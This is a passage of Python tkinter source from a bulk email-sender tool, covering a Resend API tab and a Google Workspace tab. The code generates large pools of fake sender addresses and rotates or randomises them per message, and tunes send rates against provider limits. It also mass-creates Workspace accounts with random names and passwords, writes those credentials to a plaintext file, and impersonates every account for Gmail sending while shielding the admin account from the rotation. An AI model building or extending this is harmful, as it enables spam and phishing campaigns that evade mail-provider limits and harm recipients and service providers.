        self.resend_custom_f = tk.Frame(lpad, bg=C["bg1"])
        # NOT packed initially
        
        tk.Label(self.resend_custom_f,
                 text="One email per line (e.g. user1@domain.com)",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8, "italic")).pack(anchor="w", pady=(0, 4))
        
        self.resend_custom_text = tk.Text(self.resend_custom_f, height=6,
                                            bg=C["input"], fg=C["text"],
                                            insertbackground=C["text"],
                                            relief="flat", bd=0,
                                            font=("Cascadia Code", 9))
        self.resend_custom_text.pack(fill="x", ipady=4, pady=(0, 4))
        
        # Apply default mode
        self._toggle_resend_from_mode()
        
        # ── Rate Limit
        self._sec(lpad, "⏱️ Rate Limit (delay between sends)")
        tk.Label(lpad, text="Resend free = 2 req/sec MAX. Slower = safer (no 429 errors).",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8, "italic")).pack(anchor="w", pady=(0, 4))
        
        self.resend_delay = tk.StringVar(value="500")
        delay_row = tk.Frame(lpad, bg=C["bg1"])
        delay_row.pack(fill="x", pady=(0, 4))
        for val, lbl in [
            ("250", "0.25s (4/sec — risky)"),
            ("500", "0.5s (2/sec — Resend default)"),
            ("1000", "1s (1/sec — safe)"),
            ("2000", "2s (slow)"),
            ("5000", "5s (very slow)"),
        ]:
            tk.Radiobutton(delay_row, text=lbl, variable=self.resend_delay,
                           value=val, bg=C["bg1"], fg=C["text2"],
                           selectcolor=C["bg3"], activebackground=C["bg1"],
                           font=("Segoe UI", 9)).pack(anchor="w")
        
        # Custom delay
        custom_row = tk.Frame(lpad, bg=C["bg1"])
        custom_row.pack(fill="x", pady=(4, 8))
        tk.Label(custom_row, text="Custom (ms):",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(side="left", padx=(0, 6))
        self.resend_custom_delay = tk.StringVar(value="")
        tk.Entry(custom_row, textvariable=self.resend_custom_delay,
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["text"],
                 relief="flat", bd=0, width=10,
                 font=("Segoe UI", 9)).pack(side="left", ipady=4, padx=(0, 6))
        tk.Label(custom_row, text="(overrides above ila kayan)",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 8, "italic")).pack(side="left")
        
        # ── Auto-retry on 429
        self._sec(lpad, "🔄 Auto-retry on Rate Limit")
        retry_row = tk.Frame(lpad, bg=C["bg1"])
        retry_row.pack(fill="x", pady=(0, 4))
        self.resend_auto_retry = tk.BooleanVar(value=True)
        tk.Checkbutton(retry_row, text="Auto-retry mlli kayttban 429 error",
                       variable=self.resend_auto_retry,
                       bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI", 9)).pack(anchor="w")
        
        retry_delay_row = tk.Frame(lpad, bg=C["bg1"])
        retry_delay_row.pack(fill="x", pady=(2, 0))
        tk.Label(retry_delay_row, text="Retry delay (seconds):",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(side="left", padx=(0, 6))
        self.resend_retry_delay = tk.StringVar(value="10")
        tk.Entry(retry_delay_row, textvariable=self.resend_retry_delay,
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["text"],
                 relief="flat", bd=0, width=8,
                 font=("Segoe UI", 9)).pack(side="left", ipady=4)
        
        # RIGHT — status + info
        right = tk.Frame(cols, bg=C["bg1"])
        right.pack(side="left", fill="both", expand=True)
        rpad = tk.Frame(right, bg=C["bg1"])
        rpad.pack(fill="both", expand=True, padx=14, pady=14)
        
        # ── Status
        self._sec(rpad, "📊 Status")
        self.resend_status_lbl = tk.Label(rpad,
                                            text="⚪ Not connected",
                                            bg=C["bg1"], fg=C["text3"],
                                            font=("Segoe UI", 11, "bold"),
                                            anchor="w")
        self.resend_status_lbl.pack(anchor="w", fill="x", pady=(0, 8))
        
        # ── Quota info
        self._sec(rpad, "📈 Quota Info")
        self.resend_quota_lbl = tk.Label(rpad,
                                           text="Click 🧪 Test to fetch quota info",
                                           bg=C["bg1"], fg=C["text3"],
                                           font=("Segoe UI", 9),
                                           anchor="w", justify="left")
        self.resend_quota_lbl.pack(anchor="w", fill="x", pady=(0, 8))
        
        # ── Info card
        self._sec(rpad, "💡 About Resend")
        info_text = (
            "📨 Resend API Features:\n\n"
            "✓ Modern API (clean, fast)\n"
            "✓ React Email native support\n"
            "✓ Auto-warm dedicated IPs\n"
            "✓ Domain verification required\n"
            "✓ Excellent deliverability\n\n"
            "📊 Free tier limits:\n"
            "• 100 emails/day\n"
            "• 2 requests/second\n"
            "• 1 verified domain\n\n"
            "💰 Paid tier:\n"
            "• 50K - 5M emails/month\n"
            "• 10+ requests/second (request)\n"
            "• Multiple domains\n\n"
            "🌐 Sign up: resend.com\n"
            "🔑 Get API key: Dashboard → API Keys\n"
            "📧 Verify domain: Dashboard → Domains"
        )
        tk.Label(rpad, text=info_text,
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9),
                 anchor="nw", justify="left").pack(anchor="w", fill="x")
    
    def _test_resend_connection(self):
        """Test Resend API connection."""
        api_key = self.resend_api_key.get().strip()
        if not api_key:
            messagebox.showerror("Error", "Add API Key first!")
            return
        
        if not api_key.startswith("re_"):
            messagebox.showwarning("Warning",
                "Resend API keys typically start with 're_'\n"
                "Verify the key f Resend dashboard.")
        
        self.resend_status_lbl.config(text="⏳ Testing...", fg=C["yellow"])
        
        def _test():
            try:
                import requests
                r = requests.get(
                    "https://api.resend.com/domains",
                    headers={"Authorization": f"Bearer {api_key}"},
                    timeout=10
                )
                
                if r.status_code == 200:
                    data = r.json()
                    domains = data.get("data", [])
                    verified_count = sum(1 for d in domains if d.get("status") == "verified")
                    
                    self.after(0, lambda: self.resend_status_lbl.config(
                        text=f"✅ Connected · {len(domains)} domain(s) · {verified_count} verified",
                        fg=C["green"]))
                    
                    quota_info = (
                        f"✓ API Key valid\n"
                        f"✓ Domains: {len(domains)}\n"
                        f"✓ Verified: {verified_count}\n"
                        f"✓ Headers track quota live"
                    )
                    if domains:
                        quota_info += "\n\n📋 Domains:\n"
                        for d in domains[:5]:
                            status_icon = "✓" if d.get("status") == "verified" else "⚠️"
                            quota_info += f"  {status_icon} {d.get('name', 'unknown')}\n"
                    
                    self.after(0, lambda: self.resend_quota_lbl.config(
                        text=quota_info, fg=C["text"]))
                    
                    self._log(f"✓ Resend API connected — {len(domains)} domains, {verified_count} verified", C["green"])
                    
                    # 🆕 V89: AUTO-FILL DOMAIN to autogen field
                    try:
                        # Find first verified domain
                        verified_domains = [d for d in domains if d.get("status") == "verified"]
                        target_domain = None
                        if verified_domains:
                            target_domain = verified_domains[0].get("name", "")
                        elif domains:
                            # Fallback to first available domain
                            target_domain = domains[0].get("name", "")
                        
                        if target_domain:
                            self.after(0, lambda d=target_domain: self._autofill_resend_domain(d))
                    except Exception as e:
                        print(f"Auto-fill domain error: {e}")
                
                elif r.status_code == 401:
                    self.after(0, lambda: self.resend_status_lbl.config(
                        text="❌ Invalid API Key (401)", fg=C["red"]))
                    self._log("✗ Resend: Invalid API key", C["red"])
                
                elif r.status_code == 429:
                    self.after(0, lambda: self.resend_status_lbl.config(
                        text="⚠️ Rate limited (429) — try again later", fg=C["yellow"]))
                
                else:
                    err_msg = f"HTTP {r.status_code}: {r.text[:200]}"
                    self.after(0, lambda: self.resend_status_lbl.config(
                        text=f"❌ Error {r.status_code}", fg=C["red"]))
                    self._log(f"✗ Resend: {err_msg}", C["red"])
            
            except ImportError:
                self.after(0, lambda: self.resend_status_lbl.config(
                    text="❌ Missing 'requests' library", fg=C["red"]))
                self._log("✗ Install: pip install requests", C["red"])
            except Exception as e:
                err = str(e)[:200]
                self.after(0, lambda: self.resend_status_lbl.config(
                    text=f"❌ {err[:60]}", fg=C["red"]))
                self._log(f"✗ Resend test error: {err}", C["red"])
        
        threading.Thread(target=_test, daemon=True).start()
    
    def _autofill_resend_domain(self, domain):
        """Auto-fill domain f autogen field + auto-switch mode + auto-generate pool."""
        try:
            # Set domain
            if hasattr(self, 'resend_autogen_domain'):
                self.resend_autogen_domain.set(domain)
            
            # Auto-switch to autogen mode
            if hasattr(self, 'resend_from_mode'):
                self.resend_from_mode.set("autogen")
                self._toggle_resend_from_mode()
            
            # Auto-generate pool
            self._auto_regen_pool_silent()
            
            # Also set single-mode field as fallback
            if hasattr(self, 'resend_from_email'):
                current_single = self.resend_from_email.get().strip()
                if not current_single:
                    self.resend_from_email.set(f"noreply@{domain}")
            
            self._log(f"🎯 Domain auto-filled: {domain} · Pool generated", C["green"])
        except Exception as e:
            print(f"Autofill domain error: {e}")
    
    def _get_resend_delay_ms(self):
        """Get current Resend delay in milliseconds."""
        try:
            custom = self.resend_custom_delay.get().strip()
            if custom and custom.isdigit():
                return int(custom)
            return int(self.resend_delay.get())
        except: return 500
    
    def _auto_regen_pool_silent(self):
        """Silently regenerate pool (no popups, no logs)."""
        try:
            prefix = self.resend_autogen_prefix.get().strip() or "user"
            domain = self.resend_autogen_domain.get().strip().lstrip("@")
            
            if not domain:
                return
            
            try:
                start = int(self.resend_autogen_start.get())
                end = int(self.resend_autogen_end.get())
            except:
                return
            
            if start < 1 or end < start:
                return
            
            count = end - start + 1
            if count > 1000000:
                # Skip silently for huge ranges
                self.resend_autogen_status.config(
                    text=f"⚠️ Range too big ({count:,}) — click Generate manually",
                    fg=C["yellow"])
                return
            
            self._resend_user_pool = [
                f"{prefix}{i}@{domain}" for i in range(start, end + 1)
            ]
            self._resend_user_idx = [0]
            random.shuffle(self._resend_user_pool)
            
            self.resend_autogen_status.config(
                text=f"✅ Auto-pool: {len(self._resend_user_pool):,} emails",
                fg=C["green"]
            )
        except: pass
    
    def _toggle_resend_from_mode(self):
        """Show/hide From email mode frames."""
        try:
            mode = self.resend_from_mode.get()
            # Hide all
            self.resend_single_f.pack_forget()
            self.resend_autogen_f.pack_forget()
            self.resend_custom_f.pack_forget()
            
            # Show selected
            if mode == "single":
                self.resend_single_f.pack(fill="x", pady=(2, 4))
            elif mode == "autogen":
                self.resend_autogen_f.pack(fill="x", pady=(2, 4))
                # 🆕 V88: Auto-generate pool ila domain set + pool empty
                try:
                    domain = self.resend_autogen_domain.get().strip()
                    if domain and not self._resend_user_pool:
                        self._generate_resend_user_pool()
                except: pass
            elif mode == "custom":
                self.resend_custom_f.pack(fill="x", pady=(2, 4))
        except: pass
    
    def _generate_resend_user_pool(self):
        """Build the pool of auto-generated user emails."""
        try:
            prefix = self.resend_autogen_prefix.get().strip() or "user"
            domain = self.resend_autogen_domain.get().strip()
            
            if not domain:
                messagebox.showerror("Error", "Add domain first!\nExample: contact.yourdomain.com")
                return
            
            # Clean domain (remove @ ila kayan)
            domain = domain.lstrip("@")
            
            try:
                start = int(self.resend_autogen_start.get())
                end = int(self.resend_autogen_end.get())
            except:
                messagebox.showerror("Error", "Start/End must be numbers!")
                return
            
            if start < 1 or end < start:
                messagebox.showerror("Error", "End must be >= Start, and Start >= 1")
                return
            
            count = end - start + 1
            if count > 1000000:
                if not messagebox.askyesno("Large Pool",
                    f"Generate {count:,} emails?\nThis may use lot of memory."):
                    return
            
            # Build pool
            self._resend_user_pool = [
                f"{prefix}{i}@{domain}" for i in range(start, end + 1)
            ]
            self._resend_user_idx = [0]  # reset rotation
            
            # Shuffle for randomness
            random.shuffle(self._resend_user_pool)
            
            self.resend_autogen_status.config(
                text=f"✅ Pool: {len(self._resend_user_pool):,} emails ({prefix}{start}...{prefix}{end})",
                fg=C["green"]
            )
            self._log(f"🎲 Generated {len(self._resend_user_pool):,} Resend From emails", C["green"])
        except Exception as e:
            messagebox.showerror("Error", f"Generate failed: {e}")
    
    def _get_resend_from_email(self):
        """Get next From email based on current mode.
        Returns: email string (just email, no name)
        """
        try:
            mode = self.resend_from_mode.get() if hasattr(self, 'resend_from_mode') else "single"
            
            if mode == "autogen":
                if not self._resend_user_pool:
                    # Auto-generate ila pool empty
                    self._generate_resend_user_pool()
                    if not self._resend_user_pool:
                        # Still empty, fallback to single
                        return self.resend_from_email.get().strip()
                
                # Rotate through pool
                idx = self._resend_user_idx[0] % len(self._resend_user_pool)
                self._resend_user_idx[0] += 1
                return self._resend_user_pool[idx]
            
            elif mode == "custom":
                # Get list from text widget
                text = self.resend_custom_text.get("1.0", "end-1c") if hasattr(self, 'resend_custom_text') else ""
                emails = [l.strip() for l in text.splitlines() if l.strip() and "@" in l]
                if not emails:
                    return self.resend_from_email.get().strip()
                # Random pick
                return random.choice(emails)
            
            else:  # single
                return self.resend_from_email.get().strip()
        except:
            return self.resend_from_email.get().strip() if hasattr(self, 'resend_from_email') else ""

    def _build_workspace_tab(self, parent):
        wrap = tk.Frame(parent, bg=C["bg0"])
        wrap.pack(fill="both", expand=True, padx=12, pady=12)

        left = tk.Frame(wrap, bg=C["bg1"], width=380)
        left.pack(side="left", fill="y", padx=(0,12))
        left.pack_propagate(False)
        lpad = tk.Frame(left, bg=C["bg1"])
        lpad.pack(fill="both", expand=True, padx=14, pady=14)

        self._sec(lpad, "Workspace Creation")
        self._label(lpad, "Service Account JSON").pack(anchor="w")
        ws_row = tk.Frame(lpad, bg=C["bg1"])
        ws_row.pack(fill="x", pady=(2,8))
        self.workspace_sa_entry = tk.Entry(ws_row, font=("Segoe UI",8),
                                           bg=C["input"], fg=C["text2"],
                                           insertbackground=C["accent"],
                                           relief="flat", bd=0,
                                           highlightthickness=1,
                                           highlightbackground=C["border2"],
                                           textvariable=self.workspace_sa_file)
        self.workspace_sa_entry.pack(side="left", fill="x", expand=True, ipady=5)
        tk.Button(ws_row, text="📂", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2",
                  command=self._browse_workspace_sa).pack(side="left", padx=(4,0))

        self._label(lpad, "Admin email").pack(anchor="w")
        self.workspace_admin_entry = self._entry_w(lpad, self.workspace_admin_email)
        self._label(lpad, "Workspace domain").pack(anchor="w")
        self.workspace_domain_entry = self._entry_w(lpad, self.workspace_domain)

        row = tk.Frame(lpad, bg=C["bg1"])
        row.pack(fill="x")
        c1 = tk.Frame(row, bg=C["bg1"])
        c1.pack(side="left", fill="x", expand=True, padx=(0,4))
        self._label(c1, "Users").pack(anchor="w")
        self.workspace_count_entry = self._entry_w(c1, self.workspace_create_count)

        c2 = tk.Frame(row, bg=C["bg1"])
        c2.pack(side="left", fill="x", expand=True, padx=4)
        self._label(c2, "Prefix").pack(anchor="w")
        self.workspace_prefix_entry = self._entry_w(c2, self.workspace_create_prefix)

        c3 = tk.Frame(row, bg=C["bg1"])
        c3.pack(side="left", fill="x", expand=True, padx=(4,0))
        self._label(c3, "Password").pack(anchor="w")
        self.workspace_password_entry = self._entry_w(c3, self.workspace_create_password, show="*")

        btns_top = tk.Frame(lpad, bg=C["bg1"])
        btns_top.pack(fill="x", pady=(2,0))
        ABtn(btns_top, "⚡ Connect Admin", C["accent2"], self._connect_workspace_admin, w=160).pack(side="left")
        ABtn(btns_top, "+ Create + Fill", C["green"], self._create_workspace_users_and_fill, w=160).pack(side="left", padx=(6,0))

        btns_bottom = tk.Frame(lpad, bg=C["bg1"])
        btns_bottom.pack(fill="x", pady=(6,0))
        ABtn(btns_bottom, "↻ Load Existing", C["bg4"], self._load_workspace_users_to_oauth2, w=160).pack(side="left")

        self.workspace_status_lbl = self._label(lpad, "", size=8)
        self.workspace_status_lbl.pack(anchor="w", pady=(6,0))

        self._sec(lpad, "Auto Import")
        self._label(lpad, "Create or load users here, then emails will be inserted automatically into OAuth2 SMTP Senders in the Sender tab.", size=8).pack(anchor="w")

        right = tk.Frame(wrap, bg=C["bg1"])
        right.pack(side="left", fill="both", expand=True)
        rpad = tk.Frame(right, bg=C["bg1"])
        rpad.pack(fill="both", expand=True, padx=14, pady=14)

        self._sec(rpad, "Workspace Emails Preview")
        self.workspace_preview_text = tk.Text(rpad, font=("Segoe UI",9),
                                              bg=C["input"], fg=C["text"],
                                              insertbackground=C["accent"],
                                              relief="flat", bd=0,
                                              highlightthickness=1,
                                              highlightbackground=C["border2"],
                                              wrap="none")
        self.workspace_preview_text.pack(fill="both", expand=True, pady=(2,6))
        self.workspace_preview_text.insert("1.0", "Workspace emails will appear here after Load Existing or Create + Fill.")

    def _sync_workspace_preview(self, emails):
        if hasattr(self, "workspace_preview_text"):
            self.workspace_preview_text.delete("1.0", "end")
            self.workspace_preview_text.insert("1.0", "\n".join(emails) if emails else "No emails loaded")

    def _browse_sa(self):
        path = filedialog.askopenfilename(filetypes=[("JSON","*.json"),("All","*.*")])
        if path:
            self.sa_file.set(path)
            self._sync_json_to_all_tabs(path)

    def _browse_oa_sa(self):
        path = filedialog.askopenfilename(filetypes=[("JSON","*.json"),("All","*.*")])
        if path:
            self.oa_file.set(path)
            self._sync_json_to_all_tabs(path)

    def _browse_workspace_sa(self):
        path = filedialog.askopenfilename(filetypes=[("JSON","*.json"),("All","*.*")])
        if path:
            self.workspace_sa_file.set(path)
            self._sync_json_to_all_tabs(path)
    
    def _sync_json_to_all_tabs(self, path):
        """
        Auto-sync JSON path l ga3 tabs li khassom JSON.
        Mlli wahed kayuploadi → kolchi yt'update auto!
        """
        try:
            # 1. Sender tab (sa_file)
            if hasattr(self, 'sa_file'):
                self.sa_file.set(path)
            
            # 2. OAuth2 tab (oa_file)
            if hasattr(self, 'oa_file'):
                self.oa_file.set(path)
            
            # 3. Workspace tab (workspace_sa_file)
            if hasattr(self, 'workspace_sa_file'):
                self.workspace_sa_file.set(path)
            
            # 4. Alias Generator tab
            if hasattr(self, 'alias_gen_tab') and hasattr(self.alias_gen_tab, 'json_path'):
                self.alias_gen_tab.json_path.set(path)
                self.alias_gen_tab.workspace_service = None  # Reset connection
            
            # Show SA email f log
            try:
                with open(path) as f:
                    data = json.load(f)
                    sa_email = data.get('client_email', 'unknown')
                    self._log(f"📁 JSON synced l ga3 tabs: {os.path.basename(path)}", C["accent2"])
                    self._log(f"   SA: {sa_email}", C["text3"])
            except:
                self._log(f"📁 JSON synced l ga3 tabs: {os.path.basename(path)}", C["accent2"])
        
        except Exception as e:
            self._log(f"⚠ Sync error: {e}", C["yellow"])

    def _connect_oauth2(self):
        """Connect OAuth2 SMTP accounts: one SA JSON file, multiple impersonated emails.
        🛡️ Skip admin email automatique — mafichi y'dakhel f send rotation"""
        sa_path = self.oa_file.get().strip()
        if not sa_path or not os.path.exists(sa_path):
            messagebox.showerror("Error", "Select a Service Account JSON file"); return
        all_accounts = [l.strip() for l in self.oa_senders_text.get("1.0","end").splitlines() if l.strip()]
        
        # 🛡️ Filter admin email
        admin_email = ""
        if hasattr(self, 'workspace_admin_email'):
            admin_email = self.workspace_admin_email.get().strip().lower()
        
        accounts = []
        skipped_admin = []
        for email in all_accounts:
            if admin_email and email.lower() == admin_email:
                skipped_admin.append(email)
                continue
            accounts.append(email)
        
        if skipped_admin:
            self._log(f"🛡️ Skipped admin email mn connect: {', '.join(skipped_admin)}", C["accent2"])
            # Aussi remove mn UI box
            self._merge_emails_into_oauth2_box(accounts, replace=True)
        
        if not accounts:
            messagebox.showerror("Error", "Add sender emails (admin email kayskip automatique)"); return

        self.oa_connect_status.config(text="Connecting…", fg=C["yellow"])
        self.oa_services = {}

        SCOPES = [
            "https://www.googleapis.com/auth/gmail.send",
            "https://www.googleapis.com/auth/gmail.modify",
            "https://mail.google.com/",
        ]

        def _do():
            ok, failed = [], []
            for email in accounts:
                try:
                    creds = service_account.Credentials.from_service_account_file(
                        sa_path, scopes=SCOPES)
                    creds = creds.with_subject(email)
                    import google.auth.transport.requests as _gatr
                    creds.refresh(_gatr.Request())
                    if not creds.token:
                        raise ValueError("Empty token")
                    self.oa_services[email] = creds
                    ok.append(email)
                    self._log(f"✓ OAuth2 SMTP connected: {email}", C["green"])
                except Exception as e:
                    failed.append(email)
                    self._log(f"✗ OAuth2 {email}: {str(e)[:80]}", C["red"])

            def _upd():
                if ok:
                    txt = f"✓ {len(ok)} ok · ✗ {len(failed)} fail"
                    self.oa_connect_status.config(
                        text=txt, fg=C["green"] if not failed else C["yellow"])
                    # update status bar if no API senders connected
                    if not self.services:
                        self.status_lbl.config(
                            text=f"● {len(ok)} OAuth2 SMTP connected", fg=C["green"])
                else:
                    self.oa_connect_status.config(text="All failed", fg=C["red"])
            self.after(0, _upd)

        threading.Thread(target=_do, daemon=True).start()

    def _workspace_sa_path(self):
        return self.workspace_sa_file.get().strip() or self.oa_file.get().strip() or self.sa_file.get().strip()

    def _merge_emails_into_oauth2_box(self, emails, replace=False):
        # 🛡️ Filter out admin email — mafichi y'dakhel f send rotation
        admin_email = ""
        if hasattr(self, 'workspace_admin_email'):
            admin_email = self.workspace_admin_email.get().strip().lower()
        if hasattr(self, 'admin_email') and not admin_email:
            try:
                admin_email = self.admin_email.get().strip().lower()
            except: pass
        
        # Filter input emails: skip ila kayan admin
        filtered_input = []
        skipped = 0
        for email in emails:
            email = email.strip()
            if email and admin_email and email.lower() == admin_email:
                skipped += 1
                continue
            filtered_input.append(email)
        
        # Filter current emails (ila replace=False, ngderou skip admin ila kayan)
        current = [] if replace else [
            line.strip() for line in self.oa_senders_text.get("1.0", "end").splitlines()
            if line.strip()
        ]
        # Remove admin mn current
        current = [e for e in current if not (admin_email and e.strip().lower() == admin_email)]
        
        seen = {email.lower() for email in current}
        merged = list(current)
        for email in filtered_input:
            if email and email.lower() not in seen:
                merged.append(email)
                seen.add(email.lower())
        
        self.oa_senders_text.delete("1.0", "end")
        self.oa_senders_text.insert("1.0", "\n".join(merged))
        self._sync_workspace_preview(merged)
        
        if skipped > 0 and admin_email:
            self._log(f"🛡️ Skipped admin email ({admin_email}) — mafichi y'dakhel f send", C["accent2"])

    def _build_workspace_service(self):
        if not GOOGLE_OK:
            raise RuntimeError("Google packages are missing")
        sa_path = self._workspace_sa_path()
        admin_email = self.workspace_admin_email.get().strip()
        domain = self.workspace_domain.get().strip().lower()
        if not sa_path or not os.path.exists(sa_path):
            raise ValueError("Select the OAuth2 service account JSON first")
        if not admin_email:
            raise ValueError("Enter the Workspace admin email")
        if not domain:
            raise ValueError("Enter the Workspace domain")
        svc = get_admin_service(sa_path, admin_email)
        return svc, domain, admin_email

    def _fetch_workspace_users(self, svc, domain):
        users = []
        req = svc.users().list(domain=domain, maxResults=500, orderBy="email")
        while req:
            res = req.execute()
            users.extend(res.get("users", []))
            req = svc.users().list_next(req, res)
        self.workspace_users_cache = users
        return users

    def _connect_workspace_admin(self):
        self.workspace_status_lbl.config(text="Connecting Workspace…", fg=C["yellow"])

        def _do():
            try:
                svc, domain, admin_email = self._build_workspace_service()
                svc.users().list(domain=domain, maxResults=1).execute()
                self.workspace_service = svc
                self._log(f"✓ Workspace connected: {admin_email} @ {domain}", C["green"])
                self.after(0, lambda: self.workspace_status_lbl.config(
                    text=f"✓ Connected to {domain}", fg=C["green"]))
            except Exception as e:
                self.workspace_service = None
                self._log(f"✗ Workspace connect failed: {str(e)[:120]}", C["red"])
                self.after(0, lambda: self.workspace_status_lbl.config(
                    text="Connection failed", fg=C["red"]))

        threading.Thread(target=_do, daemon=True).start()

    def _load_workspace_users_to_oauth2(self):
        self.workspace_status_lbl.config(text="Loading Workspace users…", fg=C["yellow"])

        def _do():
            try:
                svc, domain, _admin_email = self._build_workspace_service()
                self.workspace_service = svc
                users = self._fetch_workspace_users(svc, domain)
                emails = [u.get("primaryEmail", "").strip() for u in users if u.get("primaryEmail")]
                self._log(f"✓ Loaded {len(emails)} Workspace users from {domain}", C["green"])

                def _upd():
                    self._merge_emails_into_oauth2_box(emails, replace=True)
                    if not self.oa_file.get().strip() and self._workspace_sa_path():
                        self.oa_file.set(self._workspace_sa_path())
                    self.workspace_status_lbl.config(
                        text=f"✓ {len(emails)} emails loaded to OAuth2 box", fg=C["green"])
                    
                    # 🚀 AUTO-CONNECT OAuth2 b3d Load Existing!
                    if emails:
                        self._log(f"🔄 Auto-connecting OAuth2 SMTP l {len(emails)} users...", C["accent2"])
                        self.after(2000, self._connect_oauth2)

                self.after(0, _upd)
            except Exception as e:
                self._log(f"✗ Workspace load failed: {str(e)[:120]}", C["red"])
                self.after(0, lambda: self.workspace_status_lbl.config(
                    text="Load failed", fg=C["red"]))

        threading.Thread(target=_do, daemon=True).start()

    def _create_workspace_users_and_fill(self):
        try:
            count = int((self.workspace_create_count.get() or "0").strip())
        except ValueError:
            messagebox.showerror("Error", "Users count must be a number")
            return
        if count <= 0:
            messagebox.showerror("Error", "Users count must be greater than 0")
            return

        prefix = self.workspace_create_prefix.get().strip().lower()
        fixed_password = self.workspace_create_password.get().strip()
        self.workspace_status_lbl.config(text="Creating Workspace users…", fg=C["yellow"])

        def _do():
            created_emails = []
            ok = failed = 0
            try:
                svc, domain, _admin_email = self._build_workspace_service()
                self.workspace_service = svc
                existing_users = self._fetch_workspace_users(svc, domain)
                used_locals = {
                    u.get("primaryEmail", "").split("@")[0].lower()
                    for u in existing_users if u.get("primaryEmail")
                }
                credentials_dump = []

                for i in range(count):
                    first, last = rand_name()
                    if prefix:
                        local = f"{prefix}{i+1}"
                        if local in used_locals:
                            local = f"{prefix}{random.randint(1000, 9999)}"
                    else:
                        local = rand_professional_prefix(used_locals)
                    used_locals.add(local)
                    email = f"{local}@{domain}"
                    password = fixed_password or rand_password()
                    body = {
                        "primaryEmail": email,
                        "name": {"givenName": first, "familyName": last},
                        "password": password,
                        "changePasswordAtNextLogin": False,
                    }
                    try:
                        svc.users().insert(body=body).execute()
                        ok += 1
                        created_emails.append(email)
                        credentials_dump.append(f"{email}|{password}")
                        self._log(f"  ✓ Workspace user created: {email}", C["green"])
                    except Exception as e:
                        failed += 1
                        self._log(f"  ✗ Workspace create {email}: {str(e)[:120]}", C["red"])

                dump_path = ""
                if credentials_dump:
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    dump_path = os.path.join(self.base_dir, f"workspace_created_{ts}.txt")
                    with open(dump_path, "w", encoding="utf-8") as f:
                        f.write("\n".join(credentials_dump) + "\n")
                self._fetch_workspace_users(svc, domain)

                def _upd():
                    if created_emails:
                        self._merge_emails_into_oauth2_box(created_emails, replace=False)
                        if not self.oa_file.get().strip() and self._workspace_sa_path():
                            self.oa_file.set(self._workspace_sa_path())
                        msg = f"✓ {len(created_emails)} created and added"
                        if dump_path:
                            msg += f" · saved {os.path.basename(dump_path)}"
                        self.workspace_status_lbl.config(text=msg, fg=C["green"] if failed == 0 else C["yellow"])
                        
                        # 🚀 AUTO-CONNECT OAuth2 b3d Create + Fill!
                        self._log(f"🔄 Auto-connecting OAuth2 SMTP l {len(created_emails)} users...", C["accent2"])
                        # Stana 3-5 thawani bach Google y'propaga users
                        self.after(3000, self._connect_oauth2)
                    else:
                        self.workspace_status_lbl.config(text="No users created", fg=C["red"])

                self.after(0, _upd)
                self._log(f"✔ Workspace create done — {ok} ok · {failed} fail", C["green"] if failed == 0 else C["yellow"])
            except Exception as e:
                self._log(f"✗ Workspace create failed: {str(e)[:120]}", C["red"])
                self.after(0, lambda: self.workspace_status_lbl.config(
                    text="Create failed", fg=C["red"]))

        threading.Thread(target=_do, daemon=True).start()

    def _add_att(self):
        paths = filedialog.askopenfilenames()
        for p in paths:
            if p not in self.attachment_files:
                self.attachment_files.append(p)
                self.att_listbox.insert("end", os.path.basename(p))
        self.att_count_lbl.config(text=f"{len(self.attachment_files)} files")

    def _add_folder(self):
        folder = filedialog.askdirectory()
        if folder:
            added = 0
            for fname in sorted(os.listdir(folder)):
                fpath = os.path.join(folder, fname)
                if os.path.isfile(fpath) and fpath not in self.attachment_files:
                    self.attachment_files.append(fpath)
                    self.att_listbox.insert("end", fname)
                    added += 1
            self.att_count_lbl.config(text=f"{len(self.attachment_files)} files")
            self._log(f"📁 {added} files added", C["accent2"])

    def _clear_att(self):
        self.attachment_files.clear()
        self.att_listbox.delete(0,"end")
        self.att_count_lbl.config(text="0 files")
    
    # ─── FIXED ATTACHMENTS (kayMchiw m3a kol email) ───
    def _add_fixed_att(self):
        """Add fixed files li ghadi yMchiw m3a KOL email"""
        paths = filedialog.askopenfilenames(title="Select fixed attachments")
        for p in paths:
            if p not in self.fixed_attachment_files:
                self.fixed_attachment_files.append(p)
                self.fixed_att_listbox.insert("end", os.path.basename(p))
        n = len(self.fixed_attachment_files)
        self.fixed_att_count_lbl.config(
            text=f"{n} fixed file{'s' if n != 1 else ''}",
            fg=C["green"] if n else C["text3"])
        if paths:
            self._log(f"📌 Added {len(paths)} fixed attachment(s)", C["accent2"])
    
    def _clear_fixed_att(self):
        """Clear fixed attachments"""
        self.fixed_attachment_files.clear()
        self.fixed_att_listbox.delete(0, "end")
        self.fixed_att_count_lbl.config(text="0 fixed files", fg=C["text3"])
    
    def _copy_pip_command(self):
        """Copy pip install command l clipboard"""
        try:
            cmd = "pip install reportlab"
            self.clipboard_clear()
            self.clipboard_append(cmd)
            self.update()
            self._log(f"📋 Copied l clipboard: {cmd}", C["green"])
            messagebox.showinfo("Copied!",
                f"Command copied:\n\n{cmd}\n\n"
                f"1. Open CMD wla PowerShell\n"
                f"2. Paste (Ctrl+V) + Enter\n"
                f"3. Wait l install\n"
                f"4. Restart app")
        except Exception as e:
            self._log(f"✗ Copy failed: {e}", C["red"])
    
    # ─── 📦 BULK PDF → ZIP GENERATOR ─────────────────────────────
    def _get_pdfs_zip_path(self):
        """Get path l ZIP file dyal generated PDFs"""
        return os.path.join(self.base_dir, "generated_pdfs.zip")
    
    def _get_pdfs_folder(self):
        """Get folder l generated PDFs"""
        folder = os.path.join(self.base_dir, "generated_pdfs")
        os.makedirs(folder, exist_ok=True)
        return folder
    
    def _open_zip_folder(self):
        """Open folder dyal generated PDFs"""
        folder = self._get_pdfs_folder()
        try:
            import sys
            if sys.platform == "win32":
                os.startfile(folder)
